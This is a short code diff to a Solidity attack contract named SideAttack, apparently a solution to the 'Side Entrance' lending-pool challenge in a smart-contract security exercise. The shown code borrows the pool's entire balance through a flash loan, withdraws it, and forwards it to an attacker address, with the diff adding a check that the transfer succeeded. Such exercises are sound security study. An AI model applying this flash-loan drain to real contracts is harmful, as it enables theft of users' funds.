@@ -18,7 +18,8 @@ contract SideAttack is IFlashLoanEtherReceiver{
         targetAmount = address(target).balance;
         target.flashLoan(address(target).balance);
         target.withdraw();
-        attacker.call{value:targetAmount}("");
+        (bool success,) = attacker.call{value:targetAmount}("");
+        require(success,"attack failed.");
     }
     function execute() external payable override {
         SideEntranceLenderPool target = SideEntranceLenderPool(pool);
